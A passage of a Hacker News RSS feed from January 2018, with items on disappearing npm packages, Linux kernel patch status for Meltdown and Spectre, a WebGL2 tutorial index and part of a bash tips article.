<?xml version="1.0" encoding="utf-8"?>
<?xml-stylesheet type="text/xsl" href="css/feed.xsl"?>
<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom" xmlns:content="http://purl.org/rss/1.0/modules/content/" xmlns:dc="http://purl.org/dc/elements/1.1/" xmlns:media="http://search.yahoo.com/mrss/" xmlns:og="http://ogp.me/ns#">
<channel>
<atom:link rel="self" href="http://192.168.1.4/fivefilters/makefulltextfeed.php?url=hnrss.org%2Fnewest%3Fpoints%3D200&amp;max=10&amp;links=preserve&amp;exc=" />
<atom:link rel="alternate" title="Source URL" href="http://hnrss.org/newest?points=200" />
<atom:link rel="related" title="Subscribe to feed" href="http://www.subtome.com/#/subscribe?feeds=http%3A%2F%2F192.168.1.4%2Ffivefilters%2Fmakefulltextfeed.php%3Furl%3Dhnrss.org%252Fnewest%253Fpoints%253D200%26max%3D10%26links%3Dpreserve%26exc%3D&amp;back=http%3A%2F%2F192.168.1.4%2Ffivefilters%2Fmakefulltextfeed.php%3Furl%3Dhnrss.org%252Fnewest%253Fpoints%253D200%26max%3D10%26links%3Dpreserve%26exc%3D" />
<title>Hacker News: Newest</title>
<link>https://news.ycombinator.com/newest</link>
<description>Hacker News RSS</description>
<item>
<title>Many packages suddenly disappeared</title>
<link>https://github.com/npm/registry/issues/255</link>
<guid isPermaLink="true" >https://github.com/npm/registry/issues/255</guid>
<description>&lt;p&gt;&lt;del&gt;I believe this issue affects packages with versions &lt;em&gt;before&lt;/em&gt; 2018 as well as versions &lt;em&gt;after&lt;/em&gt; 2018.&lt;/del&gt;&lt;/p&gt;
&lt;p&gt;&lt;del&gt;Versions before 2018 cannot be installed, while versions after 2018 can be. For instance,&lt;/del&gt;&lt;/p&gt;
&lt;p&gt;&lt;del&gt;&lt;code&gt;require-from-string@2.0.0&lt;/code&gt; is unavailable, while &lt;code&gt;require-from-string@2.0.2&lt;/code&gt; is available. The difference between them is their publish year. Note that 2.0.2 was just published, which kicked off this series of problems.&lt;/del&gt;&lt;/p&gt;
&lt;hr/&gt;&lt;p&gt;&lt;strong&gt;Update:&lt;/strong&gt; This theory appears to be wrong. See &lt;a href=&quot;https://github.com/blackhole1&quot; class=&quot;user-mention&quot;&gt;@BlackHole1&lt;/a&gt; 's comment below :)&lt;/p&gt;
&lt;p&gt;Instead, this appears to be because floatdrop's packages have disappeared.&lt;/p&gt;
</description>
<pubDate>Sat, 06 Jan 2018 19:38:33 +0000</pubDate>
<dc:creator>xxkylexx</dc:creator>
<og:image>https://avatars0.githubusercontent.com/u/464121?s=400&amp;v=4</og:image>
<og:type>object</og:type>
<og:title>Many packages suddenly disappeared · Issue #255 · npm/registry</og:title>
<og:url>https://github.com/npm/registry/issues/255</og:url>
<og:description>https://www.npmjs.com/package/infinity-agent https://www.npmjs.com/package/timed-out https://www.npmjs.com/package/pinkie-promise All dependencies of webpack-related modules</og:description>
<dc:language>en</dc:language>
<dc:format>text/html</dc:format>
<dc:identifier>https://github.com/npm/registry/issues/255</dc:identifier>
</item>
<item>
<title>Meltdown and Spectre Linux kernel status</title>
<link>http://kroah.com/log/blog/2018/01/06/meltdown-status/</link>
<guid isPermaLink="true" >http://kroah.com/log/blog/2018/01/06/meltdown-status/</guid>
<description>&lt;p&gt;By now, everyone knows that something “big” just got announced regarding computer security. Heck, when the &lt;a href=&quot;http://www.dailymail.co.uk/sciencetech/article-5238789/Intel-says-security-updates-fix-Meltdown-Spectre.html&quot;&gt;Daily Mail does a report on it&lt;/a&gt; , you know something is bad…&lt;/p&gt;
&lt;p&gt;Anyway, I’m not going to go into the details about the problems being reported, other than to point you at the wonderfully written &lt;a href=&quot;https://googleprojectzero.blogspot.fr/2018/01/reading-privileged-memory-with-side.html&quot;&gt;Project Zero paper on the issues involved here&lt;/a&gt;. They should just give out the 2018 &lt;a href=&quot;https://pwnies.com/&quot;&gt;Pwnie&lt;/a&gt; award right now, it’s that amazingly good.&lt;/p&gt;
&lt;p&gt;If you do want technical details for how we are resolving those issues in the kernel, see the always awesome &lt;a href=&quot;https://lwn.net/Articles/743265/&quot;&gt;lwn.net writeup for the details&lt;/a&gt;.&lt;/p&gt;
&lt;p&gt;Also, here’s a good summary of &lt;a href=&quot;https://lwn.net/Articles/742999/&quot;&gt;lots of other postings&lt;/a&gt; that includes announcements from various vendors.&lt;/p&gt;
&lt;p&gt;As for how this was all handled by the companies involved, well this could be described as a textbook example of how &lt;em&gt;NOT&lt;/em&gt; to interact with the Linux kernel community properly. The people and companies involved know what happened, and I’m sure it will all come out eventually, but right now we need to focus on fixing the issues involved, and not pointing blame, no matter how much we want to.&lt;/p&gt;
&lt;h2&gt;What you can do right now&lt;/h2&gt;
&lt;p&gt;If your Linux systems are running a normal Linux distribution, go update your kernel. They should all have the updates in them already. And then keep updating them over the next few weeks, we are still working out lots of corner case bugs given that the testing involved here is complex given the huge variety of systems and workloads this affects. If your distro does not have kernel updates, then I strongly suggest changing distros right now.&lt;/p&gt;
&lt;p&gt;However there are lots of systems out there that are not running “normal” Linux distributions for various reasons (rumor has it that it is way more than the “traditional” corporate distros). They rely on the LTS kernel updates, or the normal stable kernel updates, or they are in-house franken-kernels. For those people here’s the status of what is going on regarding all of this mess in the upstream kernels you can use.&lt;/p&gt;
&lt;h2&gt;Meltdown – x86&lt;/h2&gt;
&lt;p&gt;Right now, Linus’s kernel tree contains all of the fixes we currently know about to handle the Meltdown vulnerability for the x86 architecture. Go enable the CONFIG_PAGE_TABLE_ISOLATION kernel build option, and rebuild and reboot and all should be fine.&lt;/p&gt;
&lt;p&gt;However, Linus’s tree is currently at 4.15-rc6 + some outstanding patches. 4.15-rc7 should be out tomorrow, with those outstanding patches to resolve some issues, but most people do not run a -rc kernel in a “normal” environment.&lt;/p&gt;
&lt;p&gt;Because of this, the x86 kernel developers have done a wonderful job in their development of the page table isolation code, so much so that the backport to the latest stable kernel, 4.14, has been almost trivial for me to do. This means that the latest 4.14 release (4.14.12 at this moment in time), is what you should be running. 4.14.13 will be out in a few more days, with some additional fixes in it that are needed for some systems that have boot-time problems with 4.14.12 (it’s an obvious problem, if it does not boot, just add the patches now queued up.)&lt;/p&gt;
&lt;p&gt;I would personally like to thank Andy Lutomirski, Thomas Gleixner, Ingo Molnar, Borislav Petkov, Dave Hansen, Peter Zijlstra, Josh Poimboeuf, Juergen Gross, and Linus Torvalds for all of the work they have done in getting these fixes developed and merged upstream in a form that was so easy for me to consume to allow the stable releases to work properly. Without that effort, I don’t even want to think about what would have happened.&lt;/p&gt;
&lt;p&gt;For the older long term stable (LTS) kernels, I have leaned heavily on the wonderful work of Hugh Dickins, Dave Hansen, Jiri Kosina and Borislav Petkov to bring the same functionality to the 4.4 and 4.9 stable kernel trees. I had also had immense help from Guenter Roeck, Kees Cook, Jamie Iles, and many others in tracking down nasty bugs and missing patches. I want to also call out David Woodhouse, Eduardo Valentin, Laura Abbott, and Rik van Riel for their help with the backporting and integration as well, their help was essential in numerous tricky places.&lt;/p&gt;
&lt;p&gt;These LTS kernels also have the CONFIG_PAGE_TABLE_ISOLATION build option that should be enabled to get complete protection.&lt;/p&gt;
&lt;p&gt;As this backport is very different from the mainline version that is in 4.14 and 4.15, there are different bugs happening, right now we know of some VDSO issues that are getting worked on, and some odd virtual machine setups are reporting strange errors, but those are the minority at the moment, and should not stop you from upgrading at all right now. If you do run into problems with these releases, please let us know on the stable kernel mailing list.&lt;/p&gt;
&lt;p&gt;If you rely on any other kernel tree other than 4.4, 4.9, or 4.14 right now, and you do not have a distribution supporting you, you are out of luck. The lack of patches to resolve the Meltdown problem is so minor compared to the hundreds of other known exploits and bugs that your kernel version currently contains. You need to worry about that more than anything else at this moment, and get your systems up to date first.&lt;/p&gt;
&lt;p&gt;Also, go yell at the people who forced you to run an obsoleted and insecure kernel version, they are the ones that need to learn that doing so is a totally reckless act.&lt;/p&gt;
&lt;h2&gt;Meltdown – ARM64&lt;/h2&gt;
&lt;p&gt;Right now the ARM64 set of patches for the Meltdown issue are not merged into Linus’s tree. They are &lt;a href=&quot;https://git.kernel.org/pub/scm/linux/kernel/git/arm64/linux.git/log/?h=kpti&quot;&gt;staged and ready to be merged&lt;/a&gt; into 4.16-rc1 once 4.15 is released in a few weeks. Because these patches are not in a released kernel from Linus yet, I can not backport them into the stable kernel releases (hey, we have &lt;a href=&quot;https://www.kernel.org/doc/html/latest/process/stable-kernel-rules.html&quot;&gt;rules&lt;/a&gt; for a reason…)&lt;/p&gt;
&lt;p&gt;Due to them not being in a released kernel, if you rely on ARM64 for your systems (i.e. Android), I point you at the &lt;a href=&quot;https://android.googlesource.com/kernel/common/&quot;&gt;Android Common Kernel tree&lt;/a&gt; All of the ARM64 fixes have been merged into the &lt;a href=&quot;https://android.googlesource.com/kernel/common/+/android-3.18&quot;&gt;3.18,&lt;/a&gt; &lt;a href=&quot;https://android.googlesource.com/kernel/common/+/android-4.4&quot;&gt;4.4,&lt;/a&gt; and &lt;a href=&quot;https://android.googlesource.com/kernel/common/+/android-4.9&quot;&gt;4.9 branches&lt;/a&gt; as of this point in time.&lt;/p&gt;
&lt;p&gt;I would strongly recommend just tracking those branches as more fixes get added over time due to testing and things catch up with what gets merged into the upstream kernel releases over time, especially as I do not know when these patches will land in the stable and LTS kernel releases at this point in time.&lt;/p&gt;
&lt;p&gt;For the 4.4 and 4.9 LTS kernels, odds are these patches will never get merged into them, due to the large number of prerequisite patches required. All of those prerequisite patches have been long merged and tested in the android-common kernels, so I think it is a better idea to just rely on those kernel branches instead of the LTS release for ARM systems at this point in time.&lt;/p&gt;
&lt;p&gt;Also note, I merge all of the LTS kernel updates into those branches usually within a day or so of being released, so you should be following those branches no matter what, to ensure your ARM systems are up to date and secure.&lt;/p&gt;
&lt;h2&gt;Spectre&lt;/h2&gt;
&lt;p&gt;Now things get “interesting”…&lt;/p&gt;
&lt;p&gt;Again, if you are running a distro kernel, you &lt;em&gt;might&lt;/em&gt; be covered as some of the distros have merged various patches into them that they claim mitigate most of the problems here. I suggest updating and testing for yourself to see if you are worried about this attack vector&lt;/p&gt;
&lt;p&gt;For upstream, well, the status is there is no fixes merged into any upstream tree for these types of issues yet. There are numerous patches floating around on the different mailing lists that are proposing solutions for how to resolve them, but they are under heavy development, some of the patch series do not even build or apply to any known trees, the series conflict with each other, and it’s a general mess.&lt;/p&gt;
&lt;p&gt;This is due to the fact that the Spectre issues were the last to be addressed by the kernel developers. All of us were working on the Meltdown issue, and we had no real information on exactly what the Spectre problem was at all, and what patches were floating around were in even worse shape than what have been publicly posted.&lt;/p&gt;
&lt;p&gt;Because of all of this, it is going to take us in the kernel community a few weeks to resolve these issues and get them merged upstream. The fixes are coming in to various subsystems all over the kernel, and will be collected and released in the stable kernel updates as they are merged, so again, you are best off just staying up to date with either your distribution’s kernel releases, or the LTS and stable kernel releases.&lt;/p&gt;
&lt;p&gt;It’s not the best news, I know, but it’s reality. If it’s any consolation, it does not seem that any other operating system has full solutions for these issues either, the whole industry is in the same boat right now, and we just need to wait and let the developers solve the problem as quickly as they can.&lt;/p&gt;
&lt;p&gt;The proposed solutions are not trivial, but some of them are amazingly good. The &lt;a href=&quot;https://support.google.com/faqs/answer/7625886&quot;&gt;Retpoline&lt;/a&gt; post from Paul Turner is an example of some of the new concepts being created to help resolve these issues. This is going to be an area of lots of research over the next years to come up with ways to mitigate the potential problems involved in hardware that wants to try to predict the future before it happens.&lt;/p&gt;
&lt;h2&gt;Other arches&lt;/h2&gt;
&lt;p&gt;Right now, I have not seen patches for any other architectures than x86 and arm64. There are rumors of patches floating around in some of the enterprise distributions for some of the other processor types, and hopefully they will surface in the weeks to come to get merged properly upstream. I have no idea when that will happen, if you are dependant on a specific architecture, I suggest asking on the arch-specific mailing list about this to get a straight answer.&lt;/p&gt;
&lt;h2&gt;Conclusion&lt;/h2&gt;
&lt;p&gt;Again, update your kernels, don’t delay, and don’t stop. The updates to resolve these problems will be continuing to come for a long period of time. Also, there are still lots of other bugs and security issues being resolved in the stable and LTS kernel releases that are totally independent of these types of issues, so keeping up to date is always a good idea.&lt;/p&gt;
&lt;p&gt;Right now, there are a lot of very overworked, grumpy, sleepless, and just generally pissed off kernel developers working as hard as they can to resolve these issues that they themselves did not cause at all. Please be considerate of their situation right now. They need all the love and support and free supply of their favorite beverage that we can provide them to ensure that we all end up with fixed systems as soon as possible.&lt;/p&gt;
</description>
<pubDate>Sat, 06 Jan 2018 15:39:40 +0000</pubDate>
<dc:creator>dankohn1</dc:creator>
<dc:language>en</dc:language>
<dc:format>text/html</dc:format>
<dc:identifier>http://kroah.com/log/blog/2018/01/06/meltdown-status/</dc:identifier>
</item>
<item>
<title>WebGL2 Fundamentals</title>
<link>https://webgl2fundamentals.org/</link>
<guid isPermaLink="true" >https://webgl2fundamentals.org/</guid>
<description>&lt;p/&gt;
&lt;p&gt;WebGL2 from the ground up. No magic.&lt;/p&gt;
&lt;p&gt;These are a set of articles that teach WebGL2 from basic principles. They are NOT old rehashed out of date OpenGL articles like many others on the net. They are entirely new, discarding the old out of date ideas and bringing you to a full understanding of what WebGL really is and how it really works.&lt;/p&gt;
&lt;p&gt;These articles are specifically about WebGL2. If you are interested in WebGL 1.0 please &lt;a href=&quot;http://webglfundamentals.org&quot;&gt;go here&lt;/a&gt; If you are already familar with WebGL1 you might want to look at these articles&lt;/p&gt;

&lt;ul&gt;&lt;li&gt;Fundamentals&lt;/li&gt;
&lt;li&gt;
&lt;/li&gt;
&lt;li&gt;WebGL2 vs WebGL1&lt;/li&gt;
&lt;li&gt;
&lt;/li&gt;
&lt;li&gt;Image Processing&lt;/li&gt;
&lt;li&gt;
&lt;/li&gt;
&lt;li&gt;2D translation, rotation, scale, matrix math&lt;/li&gt;
&lt;li&gt;
&lt;/li&gt;
&lt;li&gt;3D&lt;/li&gt;
&lt;li&gt;
&lt;/li&gt;
&lt;li&gt;Lighting&lt;/li&gt;
&lt;li&gt;
&lt;/li&gt;
&lt;li&gt;Structure and Organization&lt;/li&gt;
&lt;li&gt;
&lt;/li&gt;
&lt;li&gt;Geometry&lt;/li&gt;
&lt;li&gt;
&lt;/li&gt;
&lt;li&gt;Textures&lt;/li&gt;
&lt;li&gt;
&lt;/li&gt;
&lt;li&gt;Rendering To A Texture&lt;/li&gt;
&lt;li&gt;
&lt;/li&gt;
&lt;li&gt;Techniques&lt;/li&gt;
&lt;li&gt;
&lt;/li&gt;
&lt;li&gt;Misc&lt;/li&gt;
&lt;li&gt;
&lt;/li&gt;
&lt;/ul&gt;</description>
<pubDate>Sat, 06 Jan 2018 14:23:42 +0000</pubDate>
<dc:creator>indescions_2018</dc:creator>
<og:title>WebGL2 Fundamentals</og:title>
<og:type>website</og:type>
<og:image>http://webgl2fundamentals.org/webgl/lessons/resources/webgl2fundamentals.jpg</og:image>
<og:description>Learn WebGL2 from the ground up. No magic</og:description>
<og:url>http://webgl2fundamentals.org</og:url>
<dc:language>en</dc:language>
<dc:format>text/html</dc:format>
<dc:identifier>https://webgl2fundamentals.org/</dc:identifier>
</item>
<item>
<title>Things I Wish I&amp;#039;d Known About Bash</title>
<link>https://zwischenzugs.com/2018/01/06/ten-things-i-wish-id-known-about-bash/</link>
<guid isPermaLink="true" >https://zwischenzugs.com/2018/01/06/ten-things-i-wish-id-known-about-bash/</guid>
<description>&lt;h2&gt;Intro&lt;/h2&gt;
&lt;p&gt;Recently I wanted to deepen my understanding of bash by researching as much of it as possible. Because I felt bash is an often-used (and under-understood) technology, I ended up writing a &lt;a href=&quot;https://leanpub.com/learnbashthehardway&quot;&gt;book on it&lt;/a&gt;.&lt;/p&gt;
&lt;p&gt;You don’t have to look hard on the internet to find plenty of useful one-liners in bash, or scripts. And there are guides to bash that seem somewhat intimidating through either their thoroughness or their focus on esoteric detail.&lt;/p&gt;
&lt;p&gt;Here I’ve focussed on the things that either confused me or increased my power and productivity in bash significantly, and tried to communicate them (as in my book) in a way that emphasises getting the understanding right.&lt;/p&gt;
&lt;p&gt;Enjoy!&lt;/p&gt;
&lt;p&gt;&lt;a href=&quot;https://leanpub.com/learnbashthehardway&quot;&gt;&lt;img class=&quot;alignnone size-thumbnail wp-image-4192&quot; src=&quot;https://zwischenzugs.files.wordpress.com/2018/01/hero.png?w=94&amp;amp;h=150&quot; alt=&quot;hero&quot; width=&quot;94&quot; height=&quot;150&quot; srcset=&quot;https://zwischenzugs.files.wordpress.com/2018/01/hero.png?w=94&amp;amp;h=150 94w, https://zwischenzugs.files.wordpress.com/2018/01/hero.png?w=188&amp;amp;h=300 188w&quot; sizes=&quot;(max-width: 94px) 85vw, 94px&quot;/&gt;&lt;/a&gt;&lt;/p&gt;
&lt;h2&gt;1)  &lt;code&gt;``&lt;/code&gt; vs &lt;code&gt;$()&lt;/code&gt;&lt;/h2&gt;
&lt;p&gt;These two operators do the same thing. Compare these two lines:&lt;/p&gt;
&lt;pre&gt;
$ echo `ls`
$ echo $(ls)
&lt;/pre&gt;
&lt;p&gt;Why these two forms existed confused me for a long time.&lt;/p&gt;
&lt;p&gt;If you don’t know, both forms substitute the output of the command contained within it into the command.&lt;/p&gt;
&lt;p&gt;The principal difference is that nesting is simpler.&lt;/p&gt;
&lt;p&gt;Which of these is easier to read (and write)?&lt;/p&gt;
&lt;pre class=&quot;p1&quot;&gt;
&lt;span class=&quot;s1&quot;&gt;&lt;span class=&quot;Apple-converted-space&quot;&gt;    &lt;/span&gt;$ echo `echo \`echo \\\`echo inside\\\`\``
&lt;/span&gt;
&lt;/pre&gt;
&lt;p&gt;or:&lt;/p&gt;
&lt;pre class=&quot;p2&quot;&gt;
&lt;span class=&quot;s2&quot;&gt;&lt;span class=&quot;Apple-converted-space&quot;&gt;    &lt;/span&gt;$ echo $(echo $(echo $(echo inside)))&lt;/span&gt;
&lt;/pre&gt;
&lt;p&gt;If you’re interested in going deeper, see &lt;a href=&quot;http://mywiki.wooledge.org/BashFAQ/082&quot;&gt;here&lt;/a&gt; or &lt;a href=&quot;https://stackoverflow.com/questions/4708549/what-is-the-difference-between-command-and-command-in-shell-programming&quot;&gt;here&lt;/a&gt;.&lt;/p&gt;
&lt;h2&gt;2) globbing vs regexps&lt;/h2&gt;
&lt;p&gt;Another one that can confuse if never thought about or researched.&lt;/p&gt;
&lt;p&gt;While globs and regexps can look similar, they are not the same.&lt;/p&gt;
&lt;p&gt;Consider this command:&lt;/p&gt;
&lt;pre class=&quot;p1&quot;&gt;
&lt;span class=&quot;s1&quot;&gt;$ rename -n 's/(.*)/new$1/' *&lt;/span&gt;
&lt;/pre&gt;
&lt;p&gt;The two asterisks are interpreted in different ways.&lt;/p&gt;
&lt;p&gt;The first is ignored by the shell (because it is in quotes), and is interpreted as ‘0 or more characters’ by the rename application. So it’s interpreted as a regular expression.&lt;/p&gt;
&lt;p&gt;The second is interpreted by the shell (because it is not in quotes), and gets replaced by a list of all the files in the current working folder. It is interpreted as a glob.&lt;/p&gt;
&lt;p&gt;So by looking at &lt;code&gt;man bash&lt;/code&gt; can you figure out why these two commands produce different output?&lt;/p&gt;
&lt;pre&gt;
$ ls *
$ ls .*
&lt;/pre&gt;
&lt;p&gt;The second looks even more like a regular expression. But it isn’t!&lt;/p&gt;
&lt;h2&gt;3) Exit Codes&lt;/h2&gt;
&lt;p&gt;Not everyone knows that every time you run a shell command in bash, an ‘exit code’ is returned to bash.&lt;/p&gt;
&lt;p&gt;Generally, if a command ‘succeeds’ you get an error code of &lt;code&gt;0&lt;/code&gt;. If it doesn’t succeed, you get a non-zero code. &lt;code&gt;1&lt;/code&gt; is a ‘general error’, and others can give you more information (eg which signal killed it, for example).&lt;/p&gt;
&lt;p&gt;But these rules don’t always hold:&lt;/p&gt;
&lt;pre&gt;
$ grep not_there /dev/null
$ echo $?
&lt;/pre&gt;
&lt;p&gt;&lt;code&gt;$?&lt;/code&gt; is a special bash variable that’s set to the exit code of each command after it runs.&lt;/p&gt;
&lt;p&gt;Grep uses exit codes to indicate whether it matched or not. I have to look up every time which way round it goes: does finding a match or not return &lt;code&gt;0&lt;/code&gt;?&lt;/p&gt;
&lt;p&gt;Grok this and a lot will click into place in what follows.&lt;/p&gt;
&lt;h2&gt;4) &lt;code&gt;if&lt;/code&gt; statements, &lt;code&gt;[&lt;/code&gt; and &lt;code&gt;[[&lt;/code&gt;&lt;/h2&gt;
&lt;p&gt;Here’s another ‘spot the difference’ similar to the backticks one above.&lt;/p&gt;
&lt;p&gt;What will this output?&lt;/p&gt;
&lt;pre&gt;
if grep not_there /dev/null
then
    echo hi
else
    echo lo
fi
&lt;/pre&gt;
&lt;p&gt;grep’s return code makes code like this work more intuitively as a side effect of its use of exit codes.&lt;/p&gt;
&lt;p&gt;Now what will this output?&lt;/p&gt;
&lt;p&gt;a) &lt;code&gt;hihi&lt;/code&gt;&lt;br/&gt;b) &lt;code&gt;lolo&lt;/code&gt;&lt;br/&gt;c) something else&lt;/p&gt;
&lt;pre&gt;
if [ $(grep not_there /dev/null) = '' ]
then
    echo -n hi
else
    echo -n lo
fi
if [[ $(grep not_there /dev/null) = '' ]]
then
    echo -n hi
else
    echo -n lo
fi
&lt;/pre&gt;
&lt;p&gt;The difference between &lt;code&gt;[&lt;/code&gt; and &lt;code&gt;[[&lt;/code&gt; was another thing I never really understood. &lt;code&gt;[&lt;/code&gt; is the original form for tests, and then &lt;code&gt;[[&lt;/code&gt; was introduced, which is more flexible and intuitive. In the first &lt;code&gt;if&lt;/code&gt; block above, the if statement barfs because the &lt;code&gt;$(grep not_there /dev/null)&lt;/code&gt; is evaluated to nothing, resulting in this comparison:&lt;/p&gt;
&lt;p&gt;&lt;code&gt;[ = '' ]&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;which makes no sense. The double bracket form handles this for you.&lt;/p&gt;
&lt;p&gt;This is why you occasionally see comparisons like this in bash scripts:&lt;/p&gt;
&lt;p&gt;&lt;code&gt;if [ x$(grep not_there /dev/null) = 'x' ]&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;so that if the command returns nothing it still runs.&lt;/p&gt;
&lt;h2&gt;5) &lt;code&gt;set&lt;/code&gt;s&lt;/h2&gt;
&lt;p&gt;Bash has configurable options which can be set on the fly. I use two of these all the time:&lt;/p&gt;
&lt;pre&gt;
set -e
&lt;/pre&gt;
&lt;p&gt;exits from a script if any command returned a non-zero exit code (see above).&lt;/p&gt;
&lt;p&gt;This outputs the commands that get run as they run:&lt;/p&gt;
&lt;pre&gt;
set -x
&lt;/pre&gt;
&lt;p&gt;So a script might start like this:&lt;/p&gt;
&lt;pre&gt;
#!/bin/bash
set -e
set -x
grep not_there /dev/null
echo $?
&lt;/pre&gt;
&lt;p&gt;What would that script output?&lt;/p&gt;
&lt;h2&gt;6) &amp;lt;()&lt;/h2&gt;
&lt;p&gt;This is my favourite. It’s so under-used, perhaps because it can be initially baffling, but I use it all the time.&lt;/p&gt;
&lt;p&gt;It’s similar to &lt;code&gt;$()&lt;/code&gt; in that the output of the command inside is re-used.&lt;/p&gt;
&lt;p&gt;In this case, though, the output is treated as a file. This file can be used as an argument to commands that take files as an argument.&lt;/p&gt;
&lt;p&gt;Confused? Here’s an example.&lt;/p&gt;
&lt;p&gt;Have you ever done something like this?&lt;/p&gt;
&lt;pre&gt;
$ grep somestring file1 &amp;gt; /tmp/a
$ grep somestring file2 &amp;gt; /tmp/b
$ diff /tmp/a /tmp/b
&lt;/pre&gt;
&lt;p&gt;That works, but instead you can write:&lt;/p&gt;
&lt;pre&gt;
diff &amp;lt;(grep somestring file1) &amp;lt;(grep somestring file2)
&lt;/pre&gt;
&lt;p&gt;Isn’t that neater?&lt;/p&gt;
&lt;h2&gt;7) quoting&lt;/h2&gt;
&lt;p&gt;Quoting’s a knotty subject in bash, as it is in many software contexts.&lt;/p&gt;
&lt;p&gt;Firstly, variables in quotes:&lt;/p&gt;
&lt;pre class=&quot;p1&quot;&gt;
&lt;span class=&quot;s1&quot;&gt;A&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s3&quot;&gt;'&lt;/span&gt;&lt;span class=&quot;s4&quot;&gt;123&lt;/span&gt;&lt;span class=&quot;s3&quot;&gt;'&lt;/span&gt; &lt;span class=&quot;s5&quot;&gt;&lt;span class=&quot;Apple-converted-space&quot;&gt; 
&lt;/span&gt;&lt;/span&gt;&lt;span class=&quot;s3&quot;&gt;echo&lt;/span&gt; &lt;span class=&quot;s3&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;s6&quot;&gt;$A&lt;/span&gt;&lt;span class=&quot;s3&quot;&gt;&quot;
&lt;/span&gt;&lt;span class=&quot;s5&quot;&gt;echo&lt;/span&gt; &lt;span class=&quot;s5&quot;&gt;'&lt;/span&gt;&lt;span class=&quot;s7&quot;&gt;$A&lt;/span&gt;&lt;span class=&quot;s5&quot;&gt;'&lt;/span&gt;
&lt;/pre&gt;
&lt;p&gt;Pretty simple – double quotes dereference variables, while single quotes go literal.&lt;/p&gt;
&lt;p&gt;So what will this output?&lt;/p&gt;
&lt;pre&gt;
mkdir -p tmp
cd tmp
touch a
echo &quot;*&quot;
echo '*'
&lt;/pre&gt;
&lt;p&gt;Surprised? I was.&lt;/p&gt;
&lt;h2&gt;8) Top three shortcuts&lt;/h2&gt;
&lt;p&gt;There are plenty of shortcuts listed in &lt;code&gt;man bash&lt;/code&gt;, and it’s not hard to find comprehensive lists. This list consists of the ones I use most often, in order of how often I use them.&lt;/p&gt;
&lt;p&gt;Rather than trying to memorize them all, I recommend picking one, and trying to remember to use it until it becomes unconscious. Then take the next one. I’ll skip over the most obvious ones (eg &lt;code&gt;!!&lt;/code&gt; – repeat last command, and &lt;code&gt;~&lt;/code&gt; – your home directory).&lt;/p&gt;
&lt;p&gt;&lt;code&gt;&lt;strong&gt;!$&lt;/strong&gt;&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;I use this dozens of times a day. It repeats the last argument of the last command. If you’re working on a file, and can’t be bothered to re-type it command after command it can save a lot of work:&lt;/p&gt;
&lt;pre&gt;
grep somestring /long/path/to/some/file/or/other.txt
vi !$
&lt;/pre&gt;

&lt;p&gt;​​&lt;strong&gt;&lt;code&gt;!:1-$&lt;/code&gt;&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;This bit of magic takes this further. It takes all the arguments to the previous command and drops them in. So:&lt;/p&gt;
&lt;pre&gt;
grep isthere /long/path/to/some/file/or/other.txt
egrep !:1-$
fgrep !:1-$
&lt;/pre&gt;
&lt;p&gt;The &lt;code&gt;!&lt;/code&gt; means ‘look at the previous command’, the &lt;code&gt;:&lt;/code&gt; is a separator, and the &lt;code&gt;1&lt;/code&gt; means ‘take the first word’, the &lt;code&gt;-&lt;/code&gt; means ‘until’ and the &lt;code&gt;$&lt;/code&gt; means ‘the last word’.&lt;/p&gt;
&lt;p&gt;&lt;code&gt;&lt;strong&gt;:h&lt;/strong&gt;&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;I use this one a lot too. If you put it after a filename, it will change that filename to remove everything up to the folder. Like this:&lt;/p&gt;
&lt;pre&gt;
grep isthere /long/path/to/some/file/or/other.txt
cd !$:h
&lt;/pre&gt;
&lt;p&gt;which can save a lot of work in the course of the day.&lt;/p&gt;
&lt;h2&gt;9) startup order&lt;/h2&gt;
&lt;p&gt;The order in which bash runs startup scripts can cause a lot of head-scratching. I keep this diagram handy:&lt;/p&gt;
&lt;p&gt;&lt;img data-attachment-id=&quot;4194&quot; data-permalink=&quot;https://zwischenzugs.com/2018/01/06/ten-things-i-wish-id-known-about-bash/shell-startup-actual/&quot; data-orig-file=&quot;https://zwischenzugs.files.wordpress.com/2018/01/shell-startup-actual.png?w=840&quot; data-orig-size=&quot;1558,955&quot; data-comments-opened=&quot;1&quot; data-image-meta=&quot;{&amp;quot;aperture&amp;quot;:&amp;quot;0&amp;quot;,&amp;quot;credit&amp;quot;:&amp;quot;&amp;quot;,&amp;quot;camera&amp;quot;:&amp;quot;&amp;quot;,&amp;quot;caption&amp;quot;:&amp;quot;&amp;quot;,&amp;quot;created_timestamp&amp;quot;:&amp;quot;0&amp;quot;,&amp;quot;copyright&amp;quot;:&amp;quot;&amp;quot;,&amp;quot;focal_length&amp;quot;:&amp;quot;0&amp;quot;,&amp;quot;iso&amp;quot;:&amp;quot;0&amp;quot;,&amp;quot;shutter_speed&amp;quot;:&amp;quot;0&amp;quot;,&amp;quot;title&amp;quot;:&amp;quot;&amp;quot;,&amp;quot;orientation&amp;quot;:&amp;quot;0&amp;quot;}&quot; data-image-title=&quot;shell-startup-actual&quot; data-image-description=&quot;&quot; data-medium-file=&quot;https://zwischenzugs.files.wordpress.com/2018/01/shell-startup-actual.png?w=840?w=300&quot; data-large-file=&quot;https://zwischenzugs.files.wordpress.com/2018/01/shell-startup-actual.png?w=840?w=840&quot; class=&quot;alignnone size-full wp-image-4194&quot; src=&quot;https://zwischenzugs.files.wordpress.com/2018/01/shell-startup-actual.png?w=840&quot; alt=&quot;shell-startup-actual&quot; srcset=&quot;https://zwischenzugs.files.wordpress.com/2018/01/shell-startup-actual.png?w=840 840w, https://zwischenzugs.files.wordpress.com/2018/01/shell-startup-actual.png?w=150 150w, https://zwischenzugs.files.wordpress.com/2018/01/shell-startup-actual.png?w=300 300w, https://zwischenzugs.files.wordpress.com/2018/01/shell-startup-actual.png?w=768 768w, https://zwischenzugs.files.wordpress.com/2018/01/shell-startup-actual.png?w=1024 1024w, https://zwischenzugs.files.wordpress.com/2018/01/shell-startup-actual.png 1558w&quot; sizes=&quot;(max-width: 709px) 85vw, (max-width: 909px) 67vw, (max-width: 1362px) 62vw, 840px&quot;/&gt;&lt;/p&gt;
